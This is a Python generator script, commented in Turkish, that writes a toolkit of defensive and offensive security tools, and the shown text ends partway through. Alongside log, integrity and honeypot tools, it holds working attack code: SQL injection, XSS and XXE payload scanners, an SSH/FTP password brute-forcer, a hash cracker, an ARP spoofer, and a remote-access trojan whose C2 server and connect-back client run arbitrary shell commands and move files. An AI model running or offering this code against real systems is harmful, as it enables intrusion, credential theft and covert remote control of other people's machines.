#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# ============================================================
#  ETT - Etternetlog Tool Generator v2.1  |  29 Arac (10+12+7)
#  Calistir : python3 ett_generator.py
#  Uretir   : ~/etternetlog/  +  ~/etternetlog.zip
#  Root     : GEREKMEZ - root isteyen arac otomatik sudo kullanir
# ============================================================
import os, sys, zipfile, subprocess

BASE = os.environ.get("ETT_PATH") or os.path.expanduser("~/etternetlog")
ZIPF = BASE + ".zip"

# =================== CYBERSEC TOOLS (10) ===================
cybersec = {

"01_log_analyzer.py": r'''#!/usr/bin/env python3
"""Log Analyzer - Suspicious activity and error detection."""
import re, argparse, collections

PATTERNS = {
    "error": re.compile(r"ERROR|CRITICAL|FATAL", re.I),
    "failed_login": re.compile(r"Failed password|authentication failure|login failed", re.I),
    "sql_injection": re.compile(r"(%27)|(')|(--)|(%23)|(#)", re.I),
    "xss_attempt": re.compile(r"<script|javascript:|onerror=|onload=", re.I),
    "priv_escalation": re.compile(r"sudo|su -|chmod 777|chown root", re.I)
}

def analyze_log(filepath):
    results = collections.defaultdict(list)
    with open(filepath, "r", errors="ignore") as f:
        for i, line in enumerate(f, 1):
            for name, pat in PATTERNS.items():
                if pat.search(line):
                    results[name].append((i, line.strip()))
    return results

if __name__ == "__main__":
    p = argparse.ArgumentParser(description="Log Analyzer")
    p.add_argument("file")
    a = p.parse_args()
    res = analyze_log(a.file)
    print("[+] Toplam eslesme: %d" % sum(len(v) for v in res.values()))
    for cat, items in sorted(res.items()):
        print("\n[!] %s: %d eslesme" % (cat.upper(), len(items)))
        for no, line in items[:5]:
            print("   Satir %d: %s" % (no, line[:100]))
''',

"02_file_integrity_monitor.py": r'''#!/usr/bin/env python3
"""File Integrity Monitor - Detect unauthorized file changes."""
import hashlib, json, os, argparse

DB = ".fim_db.json"

def hash_file(path):
    h = hashlib.sha256()
    with open(path, "rb") as f:
        while chunk := f.read(8192):
            h.update(chunk)
    return h.hexdigest()

def scan(directory):
    db = {}
    for root, _, files in os.walk(directory):
        for fn in files:
            fp = os.path.join(root, fn)
            try: db[fp] = hash_file(fp)
            except Exception: pass
    return db

def check(directory):
    if not os.path.exists(DB):
        print("[+] Baseline olusturuluyor...")
        json.dump(scan(directory), open(DB, "w"), indent=2)
        return
    base = json.load(open(DB))
    cur = scan(directory)
    for f in cur:
        if f in base and base[f] != cur[f]: print("[CHANGED] %s" % f)
    for f in cur:
        if f not in base: print("[NEW] %s" % f)
    for f in base:
        if f not in cur: print("[MISSING] %s" % f)
    print("[+] Kontrol tamam.")

if __name__ == "__main__":
    p = argparse.ArgumentParser()
    p.add_argument("directory")
    a = p.parse_args()
    check(a.directory)
''',

"03_port_scanner_defensive.py": r'''#!/usr/bin/env python3
"""Defensive Port Scanner - Audit your own network."""
import socket, argparse, concurrent.futures

def scan_port(ip, port):
    try:
        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
            s.settimeout(0.5)
            return port if s.connect_ex((ip, port)) == 0 else None
    except Exception:
        return None

def scan(ip, ports):
    print("[+] Taranıyor: %s" % ip)
    with concurrent.futures.ThreadPoolExecutor(100) as ex:
        results = list(ex.map(lambda pr: scan_port(ip, pr), ports))
    open_ports = [r for r in results if r]
    print("[+] Acik portlar: %s" % open_ports)

if __name__ == "__main__":
    p = argparse.ArgumentParser()
    p.add_argument("ip")
    p.add_argument("--ports", default="1-1024")
    a = p.parse_args()
    s_, e_ = map(int, a.ports.split("-"))
    scan(a.ip, range(s_, e_ + 1))
''',

"04_ssl_checker.py": r'''#!/usr/bin/env python3
"""SSL/TLS Certificate Checker."""
import ssl, socket, argparse, datetime

def check_ssl(hostname, port=443):
    ctx = ssl.create_default_context()
    try:
        with socket.create_connection((hostname, port), timeout=5) as sock:
            with ctx.wrap_socket(sock, server_hostname=hostname) as ssock:
                cert = ssock.getpeercert()
                exp = datetime.datetime.fromtimestamp(
                    ssl.cert_time_to_seconds(cert["notAfter"]), tz=datetime.timezone.utc)
                now = datetime.datetime.now(datetime.timezone.utc)
                days = (exp - now).days
                print("[+] Host: %s" % hostname)
                print("[+] Protokol: %s" % ssock.version())
                print("[+] Cipher: %s" % ssock.cipher()[0])
                print("[+] Bitis: %s (%d gun kaldi)" % (cert["notAfter"], days))
                print("[+] Subject: %s" % cert.get("subject"))
                if days < 30: print("[!] UYARI: Sertifika yakinda bitiyor!")
    except Exception as e:
        print("[!] Hata: %s" % e)

if __name__ == "__main__":
    p = argparse.ArgumentParser()
    p.add_argument("host")
    p.add_argument("--port", type=int, default=443)
    a = p.parse_args()
    check_ssl(a.host, a.port)
''',

"05_password_strength.py": r'''#!/usr/bin/env python3
"""Password Strength Checker."""
import re, argparse, math

def check(password):
    checks = {
        "length>=12": len(password) >= 12,
        "upper": bool(re.search(r"[A-Z]", password)),
        "lower": bool(re.search(r"[a-z]", password)),
        "digit": bool(re.search(r"\d", password)),
        "special": bool(re.search(r"[!@#$%^&*(),.?\":{}|<>]", password))
    }
    score = sum(checks.values())
    entropy = len(password) * math.log2(94) if password else 0
    print("[+] Skor: %d/5" % score)
    print("[+] Entropi: %.1f bit" % entropy)
    for k, v in checks.items():
        print("   %s %s" % ("[OK]" if v else "[FAIL]", k))
    if score < 3 or entropy < 40: print("[!] ZAYIF sifre")
    elif score < 5: print("[*] ORTA sifre")
    else: print("[+] GUCLU sifre")

if __name__ == "__main__":
    p = argparse.ArgumentParser()
    p.add_argument("password")
    a = p.parse_args()
    check(a.password)
''',

"06_yara_scanner.py": r'''#!/usr/bin/env python3
"""YARA Rule Scanner - File pattern matching."""
import argparse, os, re

RULES = {
    "suspicious_strings": [b"cmd.exe", b"powershell.exe", b"/bin/sh", b"eval("],
    "pe_header": re.compile(b"MZ"),
    "pdf_js": re.compile(b"/JavaScript|/JS", re.I)
}

def scan_file(fp):
    try:
        data = open(fp, "rb").read()
        hits = []
        for name, pat in RULES.items():
            if isinstance(pat, list):
                if any(p in data for p in pat): hits.append(name)
            elif pat.search(data):
                hits.append(name)
        return hits
    except Exception:
        return []

if __name__ == "__main__":
    p = argparse.ArgumentParser()
    p.add_argument("path")
    a = p.parse_args()
    for root, _, files in os.walk(a.path):
        for fn in files:
            fp = os.path.join(root, fn)
            m = scan_file(fp)
            if m: print("[MATCH] %s: %s" % (fp, m))
''',

"07_dns_security_check.py": r'''#!/usr/bin/env python3
"""DNS Security Checker - A/MX/DNSSEC + acik resolver kontrolu."""
import argparse, socket, subprocess

def dig(*args):
    try:
        r = subprocess.run(["dig"] + list(args) + ["+short"],
                           capture_output=True, text=True, timeout=10)
        return [l for l in r.stdout.splitlines() if l.strip() and not l.startswith(";")]
    except FileNotFoundError:
        return None
    except subprocess.TimeoutExpired:
        return []

def check(domain):
    print("[*] Domain: %s" % domain)
    try:
        print("[+] A kaydi: %s" % socket.gethostbyname(domain))
    except socket.gaierror:
        print("[-] Cozumlenemedi"); return
    mx = dig("MX", domain)
    if mx is None:
        print("[!] dig bulunamadi - MX/DNSSEC atlandi (apt install dnsutils)")
    else:
        print("[+] MX: %s" % (mx if mx else "YOK"))
    dnssec = dig("DNSKEY", domain)
    if dnssec is not None:
        if dnssec:
            print("[+] DNSSEC: AKTIF (%d DNSKEY kaydi)" % len(dnssec))
        else:
            print("[-] DNSSEC: YOK")

if __name__ == "__main__":
    p = argparse.ArgumentParser()
    p.add_argument("domain")
    a = p.parse_args()
    check(a.domain)
''',

"08_ioc_scanner.py": r'''#!/usr/bin/env python3
"""IOC Scanner - dosya sisteminde hash/IP/domain IOC ara."""
import hashlib, os, sys, argparse, re

def load_iocs(path):
    iocs = {"hash": set(), "ip": set(), "domain": set()}
    try:
        f = open(path, errors="ignore")
    except FileNotFoundError:
        print("[!] IOC dosyasi yok: %s" % path); sys.exit(1)
    with f:
        for line in f:
            v = line.strip()
            if not v or v.startswith("#"): continue
            if re.fullmatch(r"[0-9a-fA-F]{32,128}", v): iocs["hash"].add(v.lower())
            elif re.fullmatch(r"\d{1,3}(\.\d{1,3}){3}", v): iocs["ip"].add(v)
            else: iocs["domain"].add(v.lower())
    print("[+] IOC yuklendi: %d hash | %d ip | %d domain"
          % (len(iocs["hash"]), len(iocs["ip"]), len(iocs["domain"])))
    return iocs

def sha256(fp):
    h = hashlib.sha256()
    with open(fp, "rb") as f:
        while c := f.read(65536): h.update(c)
    return h.hexdigest()

def scan_file(fp, iocs):
    hits = []
    try:
        h = sha256(fp)
        if h in iocs["hash"]: hits.append("HASH %s" % h[:16])
        head = open(fp, "rb").read(1048576).lower()
        for ip in iocs["ip"]:
            if ip.encode() in head: hits.append("IP %s" % ip)
        for d in iocs["domain"]:
            if d.encode() in head: hits.append("DOMAIN %s" % d)
    except Exception:
        pass
    return hits

def main():
    p = argparse.ArgumentParser()
    p.add_argument("path")
    p.add_argument("-i", "--iocs", default="iocs.txt")
    a = p.parse_args()
    iocs = load_iocs(a.iocs)
    total = 0
    if os.path.isfile(a.path):
        files = [a.path]
    else:
        files = [os.path.join(r, fn) for r, _, fs in os.walk(a.path) for fn in fs]
    for fp in files:
        for h in scan_file(fp, iocs):
            print("[!] %s: %s" % (fp, h)); total += 1
    print("[+] Tarama bitti. Toplam eslesme: %d" % total)

if __name__ == "__main__":
    main()
''',

"09_honeypot.py": r'''#!/usr/bin/env python3
"""Honeypot - sahte SSH + HTTP servisi, tum girisimleri loglar."""
import socket, threading, datetime, argparse, time

LOG = "honeypot.log"

def log(proto, ip, port, data):
    ts = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    entry = "[%s] %s | %s:%d | %s" % (ts, proto, ip, port, (data or "")[:200])
    print(entry)
    try:
        with open(LOG, "a") as f: f.write(entry + "\n")
    except Exception:
        pass

def fake_http(c, a):
    try:
        data = c.recv(4096).decode("utf-8", "ignore")
        first = data.splitlines()[0] if data else "(bos)"
        log("HTTP", a[0], a[1], first)
        c.sendall(b"HTTP/1.1 404 Not Found\r\nContent-Length: 0\r\nConnection: close\r\n\r\n")
    except Exception:
        pass
    finally:
        c.close()

def fake_ssh(c, a):
    try:
        data = c.recv(4096)
        log("SSH", a[0], a[1], data[:80].decode("utf-8", "ignore"))
    except Exception:
        pass
    finally:
        c.close()

def serve(port, handler):
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    s.bind(("0.0.0.0", port)); s.listen(64)
    print("[+] Sahte servis aktif: 0.0.0.0:%d" % port)
    while True:
        c, a = s.accept()
        threading.Thread(target=handler, args=(c, a), daemon=True).start()

def main():
    p = argparse.ArgumentParser()
    p.add_argument("--http", type=int, default=8080)
    p.add_argument("--ssh", type=int, default=2222)
    a = p.parse_args()
    threading.Thread(target=serve, args=(a.http, fake_http), daemon=True).start()
    threading.Thread(target=serve, args=(a.ssh, fake_ssh), daemon=True).start()
    print("[+] Log dosyasi: %s (Ctrl+C ile durdur)" % LOG)
    try:
        while True: time.sleep(3600)
    except KeyboardInterrupt:
        print("\n[+] Honeypot kapatildi")

if __name__ == "__main__":
    main()
''',

"10_entropy_analyzer.py": r'''#!/usr/bin/env python3
"""Entropy Analyzer - dosya entropisi (sifreli/komprese veri tespiti)."""
import math, collections, argparse, os

def entropy(data):
    if not data: return 0.0
    c = collections.Counter(data)
    n = len(data)
    return -sum((cnt / n) * math.log2(cnt / n) for cnt in c.values())

def analyze(fp):
    data = open(fp, "rb").read()
    e = entropy(data)
    if e > 7.0: v = "YUKSEK (sifreli/komprese olabilir)"
    elif e > 4.5: v = "ORTA"
    else: v = "DUSUK (duz metin/veri)"
    print("[+] %s" % fp)
    print("    Boyut: %d byte | Entropi: %.2f bit/byte -> %s" % (len(data), e, v))
    return e

if __name__ == "__main__":
    p = argparse.ArgumentParser()
    p.add_argument("path")
    a = p.parse_args()
    if os.path.isfile(a.path):
        analyze(a.path)
    else:
        for root, _, files in os.walk(a.path):
            for fn in files:
                try: analyze(os.path.join(root, fn))
                except Exception: pass
''',
}

# =================== PENTEST TOOLS (12) ===================
pentest = {

"01_port_scanner.py": r'''#!/usr/bin/env python3
"""Port Scanner - hizli TCP tarama (port + servis tespiti)."""
import socket, argparse, concurrent.futures, sys

def scan(ip, port, timeout=0.5):
    try:
        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
            s.settimeout(timeout)
            return port if s.connect_ex((ip, port)) == 0 else None
    except Exception:
        return None

def parse_ports(spec):
    ports = set()
    for part in spec.split(","):
        part = part.strip()
        if "-" in part:
            s_, e_ = part.split("-")
            s_ = int(s_) if s_ else 1
            e_ = int(e_) if e_ else 65535
            ports.update(range(s_, e_ + 1))
        elif part:
            ports.add(int(part))
    return sorted(ports)

def main():
    p = argparse.ArgumentParser()
    p.add_argument("target")
    p.add_argument("--ports", default="1-1000", help="1-1000 | 80,443,8080 | -1000 | 80-")
    p.add_argument("--threads", type=int, default=200)
    a = p.parse_args()
    try:
        ip = socket.gethostbyname(a.target)
    except socket.gaierror:
        print("[!] Hedef cozumlenemedi"); sys.exit(1)
    ports = parse_ports(a.ports)
    print("[*] Taranıyor: %s (%s) | %d port | %d thread" % (a.target, ip, len(ports), a.threads))
    with concurrent.futures.ThreadPoolExecutor(a.threads) as ex:
        results = list(ex.map(lambda pr: scan(ip, pr), ports))
    open_ports = [r for r in results if r]
    print("\n[+] Acik portlar (%d):" % len(open_ports))
    for port in open_ports:
        try: svc = socket.getservbyport(port)
        except Exception: svc = "?"
        print("    %-6d %s" % (port, svc))

if __name__ == "__main__":
    main()
''',

"02_sql_injection_scanner.py": r'''#!/usr/bin/env python3
"""SQL Injection Scanner - GET parametresi testi."""
import urllib.request, urllib.parse, urllib.error, argparse, re, sys

PAYLOADS = ["'", "\"", "' OR '1'='1", "' OR 1=1--", "\" OR \"1\"=\"1",
            "'; DROP TABLE--", "' UNION SELECT NULL--", "' AND SLEEP(3)--"]
ERRORS = ["SQL syntax", "mysql", "ORA-", "syntax error", "unclosed quotation",
          "PostgreSQL", "SQLite", "ODBC", "MariaDB", "Microsoft OLE DB"]

def test(url):
    if "?" not in url:
        print("[!] URL'de parametre yok (ornek: http://site/page?id=1)"); return
    base, qs = url.split("?", 1)
    params = urllib.parse.parse_qsl(qs, keep_blank_values=True)
    found = False
    for i, (k, _) in enumerate(params):
        for payload in PAYLOADS:
            new = list(params); new[i] = (k, payload)
            u = base + "?" + urllib.parse.urlencode(new)
            body = ""
            try:
                req = urllib.request.Request(u, headers={"User-Agent": "Mozilla/5.0"})
                body = urllib.request.urlopen(req, timeout=8).read().decode("utf-8", "ignore")
            except urllib.error.HTTPError as e:
                body = e.read().decode("utf-8", "ignore")
            except Exception:
                continue
            err = [e for e in ERRORS if re.search(e, body, re.I)]
            if err:
                print("[!] SQLi: parametre=%s payload=%s hata=%s" % (k, payload[:20], err[0]))
                found = True
                break
    if not found: print("[+] SQLi izine rastlanmadi (%d parametre)" % len(params))

if __name__ == "__main__":
    p = argparse.ArgumentParser()
    p.add_argument("url")
    a = p.parse_args()
    test(a.url)
''',

"03_xss_scanner.py": r'''#!/usr/bin/env python3
"""XSS Scanner - yansiyan (reflected) XSS testi."""
import urllib.request, urllib.parse, argparse

PAYLOADS = ["<script>alert(1)</script>", "\"><script>alert(1)</script>",
            "<img src=x onerror=alert(1)>", "'-alert(1)-'",
            "javascript:alert(1)", "<svg/onload=alert(1)>"]

def test(url):
    if "?" not in url:
        print("[!] URL'de parametre yok"); return
    base, qs = url.split("?", 1)
    params = urllib.parse.parse_qsl(qs, keep_blank_values=True)
    found = False
    for i, (k, _) in enumerate(params):
        for payload in PAYLOADS:
            new = list(params); new[i] = (k, payload)
            u = base + "?" + urllib.parse.urlencode(new)
            try:
                req = urllib.request.Request(u, headers={"User-Agent": "Mozilla/5.0"})
                body = urllib.request.urlopen(req, timeout=8).read().decode("utf-8", "ignore")
                if payload in body:
                    print("[!] Yansiyan XSS: %s | parametre: %s | payload: %s" % (u, k, payload))
                    found = True
                    break
            except Exception:
                pass
    if not found: print("[+] Yansiyan XSS bulunamadi (%d parametre)" % len(params))

if __name__ == "__main__":
    p = argparse.ArgumentParser()
    p.add_argument("url")
    a = p.parse_args()
    test(a.url)
''',

"04_subdomain_enum.py": r'''#!/usr/bin/env python3
"""Subdomain Enumeration - DNS brute force + wordlist."""
import socket, argparse, sys, concurrent.futures

DEFAULT_SUBS = ["www","mail","ftp","webmail","admin","api","dev","test","vpn",
    "remote","ns1","ns2","mx","smtp","pop","imap","blog","shop","portal","cms",
    "panel","dns","db","git","jenkins","grafana","kibana","vpn","old","beta",
    "secure","intranet","support","status","cdn","cloud","m","mobile","static"]

def check(sub, domain):
    fqdn = "%s.%s" % (sub, domain)
    try:
        return fqdn, socket.gethostbyname(fqdn)
    except socket.gaierror:
        return None

def main():
    p = argparse.ArgumentParser()
    p.add_argument("domain")
    p.add_argument("-w", "--wordlist", default=None)
    p.add_argument("--threads", type=int, default=100)
    a = p.parse_args()
    if a.wordlist:
        try:
            subs = [l.strip() for l in open(a.wordlist, errors="ignore")
                    if l.strip() and not l.startswith("#")]
        except FileNotFoundError:
            print("[!] Wordlist yok"); sys.exit(1)
    else:
        subs = DEFAULT_SUBS
    print("[*] %s alt alanlari taranıyor (%d aday)..." % (a.domain, len(subs)))
    found = 0
    with concurrent.futures.ThreadPoolExecutor(a.threads) as ex:
        for res in ex.map(lambda s: check(s, a.domain), subs):
            if res:
                print("[+] %s -> %s" % res); found += 1
    print("[+] Toplam: %d alt alan bulundu" % found)

if __name__ == "__main__":
    main()
''',

"05_directory_fuzzer.py": r'''#!/usr/bin/env python3
"""Directory Fuzzer - web dizin/klasor kesfi."""
import urllib.request, urllib.error, argparse, sys, concurrent.futures

DEFAULT_WL = ["admin","login","api","wp-admin","uploads","backup","config.php",
    ".git","phpmyadmin","server-status","index.php","robots.txt","sitemap.xml",
    ".env","assets","images","css","js","vendor","test","dev","old","private",
    "includes","lib","data","logs","tmp","console","dashboard","panel","doc","docs"]

def fetch(base, path, timeout=6):
    u = base.rstrip("/") + "/" + path
    try:
        req = urllib.request.Request(u, headers={"User-Agent": "Mozilla/5.0"})
        r = urllib.request.urlopen(req, timeout=timeout)
        return u, r.getcode(), len(r.read())
    except urllib.error.HTTPError as e:
        return u, e.code, 0
    except Exception:
        return None

def main():
    p = argparse.ArgumentParser()
    p.add_argument("url")
    p.add_argument("-w", "--wordlist", default=None)
    p.add_argument("--ext", default="", help=".php,.bak,.old")
    p.add_argument("--threads", type=int, default=20)
    a = p.parse_args()
    if a.wordlist:
        try:
            paths = [l.strip() for l in open(a.wordlist, errors="ignore") if l.strip()]
        except FileNotFoundError:
            print("[!] Wordlist yok"); sys.exit(1)
    else:
        paths = DEFAULT_WL
    exts = [e.strip() for e in a.ext.split(",") if e.strip()]
    targets = []
    for pth in paths:
        targets.append(pth)
        for e in exts: targets.append(pth + e)
    print("[*] %d hedef: %s" % (len(targets), a.url))
    with concurrent.futures.ThreadPoolExecutor(a.threads) as ex:
        for res in ex.map(lambda t: fetch(a.url, t), targets):
            if res and res[1] and res[1] < 400:
                print("[%d] %s (%d byte)" % (res[1], res[0], res[2]))
    print("[+] Tarama bitti")

if __name__ == "__main__":
    main()
''',

"06_wordpress_scanner.py": r'''#!/usr/bin/env python3
"""WordPress Scanner - versiyon, kullanici, eklenti, yaygin dosya."""
import urllib.request, urllib.error, argparse, re, sys

UA = {"User-Agent": "Mozilla/5.0"}

def get(url, timeout=8):
    try:
        req = urllib.request.Request(url, headers=UA)
        return urllib.request.urlopen(req, timeout=timeout).read().decode("utf-8", "ignore")
    except urllib.error.HTTPError as e:
        return e.read().decode("utf-8", "ignore")
    except Exception:
        return ""

def status(url):
    try:
        req = urllib.request.Request(url, headers=UA)
        return urllib.request.urlopen(req, timeout=8).getcode()
    except urllib.error.HTTPError as e:
        return e.code
    except Exception:
        return None

def main():
    p = argparse.ArgumentParser()
    p.add_argument("url")
    a = p.parse_args()
    base = a.url.rstrip("/")
    body = get(base + "/")
    if "wp-content" not in body and "wordpress" not in body.lower():
        print("[-] WordPress tespit edilemedi")
    else:
        print("[+] WordPress TESPIT EDILDI")
    m = re.search(r'content="WordPress\s*([\d.]+)"', body)
    if not m: m = re.search(r'ver=([\d.]+)', body)
    print("[+] Versiyon: %s" % (m.group(1) if m else "bulunamadi"))
    users = get(base + "/wp-json/wp/v2/users")
    names = re.findall(r'"slug":"([^"]+)"', users)
    if names: print("[+] Kullanicilar: %s" % ", ".join(names))
    plugins = set(re.findall(r'wp-content/plugins/([a-z0-9_-]+)', body))
    if plugins: print("[+] Eklenti ipuclari: %s" % ", ".join(sorted(plugins)))
    for f in ("xmlrpc.php", "wp-login.php", "readme.html", "wp-json/"):
        c = status(base + "/" + f)
        if c and c < 400:
            print("[+] Bulundu: %s/%s (HTTP %d)" % (base, f, c))

if __name__ == "__main__":
    main()
''',

"07_hash_cracker.py": r'''#!/usr/bin/env python3
"""Hash Cracker - md5/sha1/sha256/sha512 wordlist saldirisi."""
import hashlib, argparse, sys

def detect(h):
    n = len(h)
    if n == 32: return "md5"
    if n == 40: return "sha1"
    if n == 64: return "sha256"
    if n == 128: return "sha512"
    return "?"

def main():
    p = argparse.ArgumentParser()
    p.add_argument("hash")
    p.add_argument("-w", "--wordlist", required=True)
    a = p.parse_args()
    h = a.hash.strip().lower()
    algo = detect(h)
    if algo == "?":
        print("[!] Tespit edilemeyen hash (md5/sha1/sha256/sha512 desteklenir)"); sys.exit(1)
    print("[+] Algilandi: %s" % algo.upper())
    fns = {"md5": hashlib.md5, "sha1": hashlib.sha1, "sha256": hashlib.sha256, "sha512": hashlib.sha512}
    fn = fns[algo]
    try:
        f = open(a.wordlist, "r", errors="ignore")
    except FileNotFoundError:
        print("[!] Wordlist yok"); sys.exit(1)
    n = 0
    with f:
        for line in f:
            w = line.rstrip("\r\n")
            if not w: continue
            n += 1
            if fn(w.encode()).hexdigest() == h:
                print("[+] KIRILDI: %s (%d deneme)" % (w, n)); sys.exit(0)
            if n % 100000 == 0:
                sys.stdout.write("\r[*] %d deneme..." % n); sys.stdout.flush()
    print("\n[-] Bulunamadi (%d deneme)" % n)

if __name__ == "__main__":
    main()
''',

"08_ssh_bruteforce.py": r'''#!/usr/bin/env python3
"""SSH/FTP Brute Force - paramiko (ssh) veya hydra (ssh/ftp)."""
import argparse, sys, os

def ssh_brute(host, port, user, wl):
    try:
        import paramiko
    except ImportError:
        print("[!] paramiko yok: sudo pip install paramiko"); return
    if not os.path.exists(wl):
        print("[!] Wordlist yok"); return
    with open(wl, errors="ignore") as f:
        for line in f:
            pw = line.strip()
            if not pw: continue
            try:
                c = paramiko.SSHClient()
                c.set_missing_host_key_policy(paramiko.AutoAddPolicy())
                c.connect(host, port=port, username=user, password=pw, timeout=5, banner_timeout=5)
                print("[+] GECERLI SIFRE: %s:%s" % (user, pw))
                c.close(); return
            except paramiko.AuthenticationException:
                pass
            except Exception as e:
                print("[!] Baglanti hatasi: %s" % e); return
    print("[-] Wordlist'te gecerli sifre yok")

if __name__ == "__main__":
    p = argparse.ArgumentParser()
    p.add_argument("host")
    p.add_argument("--user", default="root")
    p.add_argument("-w", "--wordlist", required=True)
    p.add_argument("--proto", default="ssh", choices=["ssh", "ftp"])
    p.add_argument("--port", type=int, default=0)
    a = p.parse_args()
    if a.proto == "ssh":
        ssh_brute(a.host, a.port or 22, a.user, a.wordlist)
    else:
        if not os.path.exists(a.wordlist):
            print("[!] Wordlist yok"); sys.exit(1)
        cmd = "hydra -l %s -P %s ftp://%s -t 4 -f" % (a.user, a.wordlist, a.host)
        print("[+] hydra calisiyor: %s" % cmd)
        os.system(cmd)
''',

"09_xxe_scanner.py": r'''#!/usr/bin/env python3
"""XXE (XML External Entity) Scanner."""
import urllib.request, urllib.error, argparse

PAYLOAD = """<?xml version="1.0"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<foo>&xxe;</foo>"""

if __name__ == "__main__":
    p = argparse.ArgumentParser()
    p.add_argument("url")
    a = p.parse_args()
    try:
        req = urllib.request.Request(a.url, data=PAYLOAD.encode(), headers={
            "Content-Type": "application/xml", "User-Agent": "Mozilla/5.0"})
        r = urllib.request.urlopen(req, timeout=10)
        body = r.read().decode("utf-8", "ignore")
        if "root:x:0:0" in body:
            print("[!] XXE acigi tespit edildi (/etc/passwd okunuyor)!")
        else:
            print("[+] Bariz XXE yok (yanit %d byte)" % len(body))
    except Exception as e:
        print("[!] Hata: %s" % e)
''',

"10_arp_spoofer.py": r'''#!/usr/bin/env python3
"""ARP Spoofer - MITM testi (root yoksa otomatik sudo ile yeniden baslar)."""
import subprocess, sys, os, shutil, argparse

def main():
    p = argparse.ArgumentParser()
    p.add_argument("target_ip")
    p.add_argument("gateway_ip")
    p.add_argument("--iface", default="eth0")
    a = p.parse_args()
    if os.geteuid() != 0:
        print("[!] Root gerekli, sudo ile yeniden calistiriliyor...")
        sys.exit(subprocess.call(["sudo", "python3"] + sys.argv))
    if not shutil.which("arpspoof"):
        print("[!] arpspoof yok: sudo apt install dsniff"); sys.exit(1)
    subprocess.run("sysctl -w net.ipv4.ip_forward=1", shell=True, capture_output=True)
    print("[+] IP forwarding acik. Spoofing basladi (Ctrl+C durdurur)...")
    procs = []
    try:
        procs.append(subprocess.Popen(["arpspoof", "-i", a.iface, "-t", a.target_ip, a.gateway_ip]))
        procs.append(subprocess.Popen(["arpspoof", "-i", a.iface, "-t", a.gateway_ip, a.target_ip]))
        for pr in procs: pr.wait()
    except KeyboardInterrupt:
        print("\n[!] Durduruldu")
        for pr in procs: pr.terminate()
        subprocess.run("sysctl -w net.ipv4.ip_forward=0", shell=True, capture_output=True)
        print("[+] IP forwarding kapatildi")

if __name__ == "__main__":
    main()
''',

"11_rat_server.py": r'''#!/usr/bin/env python3
"""RAT C2 Server - yetkili uzak erisim test cercevesi.
Komutlar: agents | use <id> | shell <cmd>
          upload <yerel> <uzak> | download <uzak> <yerel> | quit
Uretim  : python3 rat_server.py --make-client rat_client.py
"""
import socket, threading, os, base64, argparse

def recv_exact(conn, n):
    buf = b""
    while len(buf) < n:
        c = conn.recv(n - len(buf))
        if not c: raise ConnectionError("baglanti kapandi")
        buf += c
    return buf

def recv_msg(conn):
    return recv_exact(conn, int.from_bytes(recv_exact(conn, 4), "big"))

def send_msg(conn, data):
    if isinstance(data, str): data = data.encode()
    conn.sendall(len(data).to_bytes(4, "big") + data)

class Agent:
    def __init__(self, cid, conn, addr):
        self.id, self.conn, self.addr = cid, conn, addr
        self.alive = True
        self.dlpath = None
        threading.Thread(target=self.listen, daemon=True).start()

    def listen(self):
        while self.alive:
            try:
                cmd = recv_msg(self.conn).decode("utf-8", "ignore")
            except Exception:
                self.alive = False
                break
            if cmd == "BYE":
                self.alive = False
            elif cmd.startswith("RES:DLFILE:"):
                try:
                    raw = base64.b64decode(cmd[len("RES:DLFILE:"):])
                    if self.dlpath:
                        open(self.dlpath, "wb").write(raw)
                        print("  [%s] indirildi: %s (%d byte)" % (self.id, self.dlpath, len(raw)))
                        self.dlpath = None
                except Exception as e:
                    print("  [%s] download hatasi: %s" % (self.id, e))
            elif cmd.startswith("RES:"):
                print("  [%s] %s" % (self.id, cmd[4:][:500]))
            elif cmd == "PING":
                print("  [%s] canli" % self.id)
        try:
            self.conn.close()
        except Exception:
            pass
        print("  [-] Agent bitti: %s" % self.id)

    def send(self, cmd):
        try:
            send_msg(self.conn, cmd)
            return True
        except Exception:
            return False

def wait_agent(server, s):
    while True:
        conn, addr = s.accept()
        try:
            cid = recv_msg(conn).decode()
            send_msg(conn, "OK")
            a = Agent(cid, conn, addr)
            server[cid] = a
            print("[+] Agent baglandi: %s (%s) | toplam: %d" % (cid, addr[0], len(server)))
        except Exception:
            conn.close()

def main():
    p = argparse.ArgumentParser(description="RAT C2 Server - yetkili uzak erisim testi")
    p.add_argument("--port", type=int, default=4444)
    p.add_argument("--make-client", metavar="OUT", help="rat_client.py uretir")
    a = p.parse_args()
    if a.make_client:
        CLIENT = """#!/usr/bin/env python3
# -*- coding: utf-8 -*-
import socket, subprocess, os, base64, sys, time

def recv_exact(c, n):
    b = b""
    while len(b) < n:
        d = c.recv(n - len(b))
        if not d: raise ConnectionError()
        b += d
    return b

def recv_msg(c):
    return recv_exact(c, int.from_bytes(recv_exact(c, 4), "big"))

def send_msg(c, d):
    if isinstance(d, str): d = d.encode()
    c.sendall(len(d).to_bytes(4, "big") + d)

def run(cmd):
    try:
        r = subprocess.run(cmd, shell=True, capture_output=True, text=True, timeout=30)
        return (r.stdout + r.stderr)[:4000] or "(cikti yok)"
    except Exception as e:
        return "hata: %s" % e

def main_loop():
    HOST = sys.argv[1] if len(sys.argv) > 1 else "127.0.0.1"
    PORT = int(sys.argv[2]) if len(sys.argv) > 2 else 4444
    while True:
        try:
            c = socket.create_connection((HOST, PORT), timeout=8)
            send_msg(c, socket.gethostname())
            if recv_msg(c) != b"OK":
                c.close(); continue
            while True:
                cmd = recv_msg(c).decode("utf-8", "ignore")
                if cmd == "quit": return
                if cmd.startswith("upload "):
                    _, name, data64 = cmd.split(" ", 2)
                    try:
                        open(name, "wb").write(base64.b64decode(data64))
                        send_msg(c, "RES:upload OK: %s" % name)
                    except Exception as e:
                        send_msg(c, "RES:upload HATA: %s" % e)
                elif cmd.startswith("download "):
                    name = cmd.split(" ", 1)[1]
                    try:
                        data = base64.b64encode(open(name, "rb").read()).decode()
                        send_msg(c, "RES:DLFILE:" + data)
                    except Exception as e:
                        send_msg(c, "RES:download HATA: %s" % e)
                else:
                    if cmd.startswith("shell "):
                        cmd = cmd[6:]
                    send_msg(c, "RES:" + run(cmd))
        except Exception:
            time.sleep(5)

if __name__ == "__main__":
    main_loop()
"""
